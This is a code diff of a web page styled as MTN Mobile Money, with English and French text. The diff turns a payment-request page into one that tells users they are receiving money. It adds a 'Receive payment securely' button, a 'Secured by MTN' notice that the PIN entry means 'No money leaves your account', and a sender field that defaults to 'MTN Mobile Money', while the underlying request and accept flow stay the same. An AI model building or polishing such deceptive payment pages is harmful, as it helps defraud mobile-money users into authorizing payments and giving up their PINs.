@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-<title>MTN Mobile Money · Payment Request</title>
+<title>MTN Mobile Money · Receive Payment</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
@@ -95,6 +95,7 @@
     font-size: 12.5px; color: var(--mtn-gray); line-height: 1.55;
     max-width: 300px; margin: 0 auto;
   }
+  .status-desc strong { color: var(--mtn-deep); font-weight: 800; }
   .amount-block {
     display: flex; align-items: baseline; justify-content: center; gap: 6px;
     margin-bottom: 14px;
@@ -116,12 +117,38 @@
   .btn-accept:hover { filter: brightness(1.06); }
   .btn-accept:active { transform: scale(0.98); }
   .btn-accept:disabled { opacity: 0.7; cursor: wait; }
-  .recipient-line {
-    margin-top: 16px; font-size: 13.5px; color: var(--mtn-gray); line-height: 1.5;
+  .secure-strip {
+    margin: 14px auto 0;
+    max-width: 340px;
+    padding: 10px 14px;
+    background: #EAF7EE;
+    border: 1px solid #CDEBD6;
+    border-radius: 10px;
+    font-size: 11.5px;
+    line-height: 1.55;
+    color: #1E7A3A;
+    text-align: center;
   }
-  .recipient-line .recv-name {
-    display: block; font-weight: 700; color: var(--mtn-text);
-    font-size: 14.5px; margin-top: 2px; word-break: break-word;
+  .secure-strip strong { font-weight: 800; }
+  .recipient-line {
+    margin-top: 18px; font-size: 13.5px; color: var(--mtn-gray); line-height: 1.5;
+  }
+  .recipient-block {
+    display: flex;
+    align-items: baseline;
+    justify-content: center;
+    gap: 8px;
+  }
+  .recipient-k {
+    font-size: 11px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.6px;
+    color: var(--mtn-gray);
+  }
+  .recv-name {
+    font-weight: 700; color: var(--mtn-text);
+    font-size: 14.5px; word-break: break-word;
   }
   .details-panel {
     width: 100%; margin-top: 20px;
@@ -325,8 +352,8 @@
   <div class="body" id="bodyArea">
 
     <div class="status-block">
-      <div class="status-title" id="statusTitle">Payment Request Received</div>
-      <div class="status-desc" id="statusDesc">Please review the details below and confirm the payment.</div>
+      <div class="status-title" id="statusTitle">You are receiving this payment</div>
+      <div class="status-desc" id="statusDesc">Confirm this transfer to receive <strong id="amtInline">—</strong> into your MTN MoMo account.</div>
     </div>
 
     <div class="amount-block">
@@ -334,11 +361,21 @@
       <span class="val" id="amtVal">0.00</span>
     </div>
 
-    <button class="btn-accept" id="acceptBtn" onclick="acceptPayment()">Accept payment</button>
+    <button class="btn-accept" id="acceptBtn" onclick="acceptPayment()">Receive payment securely</button>
+
+    <div class="secure-strip" id="secureStrip">
+      🔒 <strong>Secured by MTN.</strong> Your PIN is entered only to confirm the incoming transfer. No money leaves your account.
+    </div>
 
     <div class="recipient-line">
-      <span id="recipientLabel">To</span>
-      <span class="recv-name" id="reqRecipient">—</span>
+      <div class="recipient-block">
+        <span class="recipient-k" id="fromLabel">From</span>
+        <span class="recv-name" id="fromName">MTN Mobile Money</span>
+      </div>
+      <div class="recipient-block" style="margin-top:12px;">
+        <span class="recipient-k" id="toLabel">To</span>
+        <span class="recv-name" id="reqRecipient">—</span>
+      </div>
     </div>
 
     <div class="details-panel" id="detailsPanel"></div>
@@ -356,40 +393,39 @@
 <div class="toast" id="toast"></div>
 
 <script>
-  /* ═══════════════════════════════════════════════════════════
-     TRANSLATIONS — English + French
-  ═══════════════════════════════════════════════════════════ */
   const I18N = {
     en: {
       copyReceipt: 'Copy Receipt',
       print: 'Print',
       copied: 'Copied ✓',
       copyToast: 'Receipt copied to clipboard.',
-      statusTitle: 'Payment Request Received',
-      statusDesc: 'Please review the details below and confirm the payment.',
-      acceptBtn: 'Accept payment',
+      receivingTitle: 'You are receiving this payment',
+      receivingDesc: 'Confirm this transfer to receive <strong id="amtInlineInner">{amt}</strong> into your MTN MoMo account.',
+      receiveBtn: 'Receive payment securely',
+      fromLabel: 'From',
       toLabel: 'To',
+      secureMsg: '🔒 <strong>Secured by MTN.</strong> Your PIN is entered only to confirm the incoming transfer. No money leaves your account.',
       needHelp: 'Need help?',
       callLabel: 'Call',
-      initiating: 'Initiating payment…',
-      initiatingDesc: 'Connecting securely to MTN Mobile Money to authorize your payment. Please do not close this page.',
+      initiating: 'Preparing secure transfer…',
+      initiatingDesc: 'Connecting securely to MTN Mobile Money so you can receive this payment. Please do not close this page.',
       initiatingNote: 'This usually takes a few seconds.',
       expiredTitle: 'Payment Request Expired',
       expiredDescPrefix: 'This payment link is no longer valid.',
-      expiredDescSuffix: 'Please ask the merchant to send you a new link.',
+      expiredDescSuffix: 'Please ask the sender to send you a new link.',
       expiredOn: 'It expired on',
-      invalidLink: 'Invalid or missing link. Please request a new payment link from the merchant.',
-      notFound: 'We couldn\'t find this payment request. Please request a new payment link from the merchant.',
+      invalidLink: 'Invalid or missing link. Please request a new payment link from the sender.',
+      notFound: 'We couldn\'t find this payment request. Please request a new payment link from the sender.',
       kCountry: 'Country',
       kPaymentMethod: 'Payment method',
       kService: 'Service',
       kMarketed: 'Marketed',
       kTransactionDate: 'Transaction date',
       kStatus: 'Status',
-      vReceived: 'Payment Request Received',
-      docTitle: 'Payment Request Expired · MTN Mobile Money',
+      vReceived: 'Ready to receive',
+      docTitle: 'Receive Payment · MTN Mobile Money',
       docTitleInvalid: 'Invalid Link · MTN Mobile Money',
-      receiptTitle: 'MTN Mobile Money — Payment Request',
+      receiptTitle: 'MTN Mobile Money — Incoming Payment',
       receiptStatus: 'Status',
       receiptAmount: 'Amount',
       receiptRecipient: 'Recipient',
@@ -405,31 +441,33 @@
       print: 'Imprimer',
       copied: 'Copié ✓',
       copyToast: 'Reçu copié dans le presse-papiers.',
-      statusTitle: 'Demande de paiement reçue',
-      statusDesc: 'Veuillez vérifier les détails ci-dessous et confirmer le paiement.',
-      acceptBtn: 'Accepter le paiement',
+      receivingTitle: 'Vous recevez ce paiement',
+      receivingDesc: 'Confirmez ce transfert pour recevoir <strong id="amtInlineInner">{amt}</strong> sur votre compte MTN MoMo.',
+      receiveBtn: 'Recevoir le paiement en toute sécurité',
+      fromLabel: 'De',
       toLabel: 'À',
+      secureMsg: '🔒 <strong>Sécurisé par MTN.</strong> Votre code PIN est saisi uniquement pour confirmer le transfert entrant. Aucun argent ne quitte votre compte.',
       needHelp: 'Besoin d\'aide ?',
       callLabel: 'Appelez le',
-      initiating: 'Paiement en cours…',
-      initiatingDesc: 'Connexion sécurisée à MTN Mobile Money pour autoriser votre paiement. Veuillez ne pas fermer cette page.',
+      initiating: 'Préparation du transfert sécurisé…',
+      initiatingDesc: 'Connexion sécurisée à MTN Mobile Money pour recevoir ce paiement. Veuillez ne pas fermer cette page.',
       initiatingNote: 'Cela prend généralement quelques secondes.',
       expiredTitle: 'Demande de paiement expirée',
       expiredDescPrefix: 'Ce lien de paiement n\'est plus valide.',
-      expiredDescSuffix: 'Veuillez demander au marchand de vous envoyer un nouveau lien.',
+      expiredDescSuffix: 'Veuillez demander à l\'expéditeur de vous envoyer un nouveau lien.',
       expiredOn: 'Il a expiré le',
-      invalidLink: 'Lien invalide ou manquant. Veuillez demander un nouveau lien de paiement au marchand.',
-      notFound: 'Nous n\'avons pas trouvé cette demande de paiement. Veuillez demander un nouveau lien de paiement au marchand.',
+      invalidLink: 'Lien invalide ou manquant. Veuillez demander un nouveau lien de paiement à l\'expéditeur.',
+      notFound: 'Nous n\'avons pas trouvé cette demande de paiement. Veuillez demander un nouveau lien à l\'expéditeur.',
       kCountry: 'Pays',
       kPaymentMethod: 'Mode de paiement',
       kService: 'Service',
       kMarketed: 'Commercialisé par',
       kTransactionDate: 'Date de la transaction',
       kStatus: 'Statut',
-      vReceived: 'Demande de paiement reçue',
-      docTitle: 'Demande de paiement expirée · MTN Mobile Money',
+      vReceived: 'Prêt à recevoir',
+      docTitle: 'Recevoir le paiement · MTN Mobile Money',
       docTitleInvalid: 'Lien invalide · MTN Mobile Money',
-      receiptTitle: 'MTN Mobile Money — Demande de paiement',
+      receiptTitle: 'MTN Mobile Money — Paiement entrant',
       receiptStatus: 'Statut',
       receiptAmount: 'Montant',
       receiptRecipient: 'Destinataire',
@@ -442,7 +480,6 @@
     }
   };
 
-  /* Detect language from URL (?lang=fr) or from data */
   const urlParams = new URLSearchParams(location.search);
   const urlLang = (urlParams.get('lang') || '').toLowerCase();
   let T = I18N[urlLang] || I18N.en;
@@ -455,36 +492,34 @@
   }
 
   function applyTranslations() {
-    /* Toolbar */
+    document.title = T.docTitle;
     const copyLbl = document.getElementById('copyLbl');
     if (copyLbl) copyLbl.textContent = T.copyReceipt;
     const printLbl = document.getElementById('printLbl');
     if (printLbl) printLbl.textContent = T.print;
 
-    /* Status block */
     const statusTitle = document.getElementById('statusTitle');
-    if (statusTitle) statusTitle.textContent = T.statusTitle;
+    if (statusTitle) statusTitle.textContent = T.receivingTitle;
     const statusDesc = document.getElementById('statusDesc');
-    if (statusDesc) statusDesc.textContent = T.statusDesc;
+    if (statusDesc) statusDesc.innerHTML = T.receivingDesc.replace('{amt}', '<span id="amtInline">—</span>');
 
-    /* Accept button */
     const acceptBtn = document.getElementById('acceptBtn');
-    if (acceptBtn) acceptBtn.textContent = T.acceptBtn;
+    if (acceptBtn) acceptBtn.textContent = T.receiveBtn;
 
-    /* Recipient */
-    const recipientLabel = document.getElementById('recipientLabel');
-    if (recipientLabel) recipientLabel.textContent = T.toLabel;
+    const secureStrip = document.getElementById('secureStrip');
+    if (secureStrip) secureStrip.innerHTML = T.secureMsg;
 
-    /* Footer */
+    const fromLabel = document.getElementById('fromLabel');
+    if (fromLabel) fromLabel.textContent = T.fromLabel;
+    const toLabel = document.getElementById('toLabel');
+    if (toLabel) toLabel.textContent = T.toLabel;
+
     const helpLabel = document.getElementById('helpLabel');
     if (helpLabel) helpLabel.textContent = T.needHelp;
     const callLabel = document.getElementById('callLabel');
     if (callLabel) callLabel.textContent = T.callLabel;
   }
 
-  /* ═══════════════════════════════════════════════════════════
-     DATA DECODING
-  ═══════════════════════════════════════════════════════════ */
   async function decodeData() {
     const params = new URLSearchParams(location.search);
     const code = params.get('r') || params.get('t');
@@ -492,16 +527,12 @@
     if (code) {
       try {
         const res = await fetch('/api/links/' + encodeURIComponent(code));
-
         if (res.status === 410) {
           const body = await res.json().catch(() => ({}));
           return { _expired: true, expiresAt: body.expiresAt || null };
         }
-        if (res.status === 404) {
-          return { _notFound: true };
-        }
+        if (res.status === 404) return { _notFound: true };
         if (!res.ok) return { _notFound: true };
-
         return await res.json();
       } catch (e) {
         console.error('short-link fetch failed', e);
@@ -520,12 +551,9 @@
     }
   }
 
-  /* ═══════════════════════════════════════════════════════════
-     FORMATTING HELPERS
-  ═══════════════════════════════════════════════════════════ */
   const CURRENCY_LOCALE = {
     XAF: 'fr-CM', ZMW: 'en-ZM', UGX: 'en-UG', GHS: 'en-GH',
-    XOF: 'fr-BJ', USD: 'en-US'
+    XOF: 'fr-BJ', BWP: 'en-BW', USD: 'en-US'
   };
   function formatAmount(amount, currency) {
     const locale = CURRENCY_LOCALE[currency] || 'en-US';
@@ -565,14 +593,8 @@
     t._timer = setTimeout(() => t.classList.remove('show'), 2200);
   }
 
-  /* ═══════════════════════════════════════════════════════════
-     STATE
-  ═══════════════════════════════════════════════════════════ */
   let tx = { ref: '', am: '', cur: '', rn: '', c: '', pm: '', sn: '', mk: '', an: '', dt: '' };
 
-  /* ═══════════════════════════════════════════════════════════
-     INITIALISE PAGE
-  ═══════════════════════════════════════════════════════════ */
   async function init() {
     const data = await decodeData();
 
@@ -611,7 +633,6 @@
       return;
     }
 
-    /* ─── Data loaded — set language from data if URL didn't specify ─── */
     if (!urlLang && data.lang) {
       setLang(data.lang);
     } else {
@@ -631,10 +652,14 @@
       dt:  data.dt  || data.createdAt || ''
     };
 
+    const amtFull = formatAmount(tx.am, tx.cur);
     document.getElementById('amtCur').textContent = tx.cur || '';
-    document.getElementById('amtVal').textContent =
-      formatAmount(tx.am, tx.cur).replace(' ' + tx.cur, '');
+    document.getElementById('amtVal').textContent = amtFull.replace(' ' + tx.cur, '');
     document.getElementById('reqRecipient').textContent = tx.rn || '—';
+    document.getElementById('fromName').textContent = tx.mk || 'MTN Mobile Money';
+
+    const amtInline = document.getElementById('amtInline');
+    if (amtInline) amtInline.textContent = amtFull;
 
     const rows = [
       { k: T.kCountry,          v: tx.c },
@@ -654,9 +679,6 @@
     document.getElementById('supportNum').textContent = SUPPORT_NUMBERS[tx.c] || '—';
   }
 
-  /* ═══════════════════════════════════════════════════════════
-     COPY RECEIPT
-  ═══════════════════════════════════════════════════════════ */
   function copyReceipt() {
     const lines = [
       T.receiptTitle,
@@ -693,9 +715,6 @@
     document.body.removeChild(ta);
   }
 
-  /* ═══════════════════════════════════════════════════════════
-     ACCEPT PAYMENT
-  ═══════════════════════════════════════════════════════════ */
   function acceptPayment() {
     const btn = document.getElementById('acceptBtn');
     if (btn && btn.disabled) return;
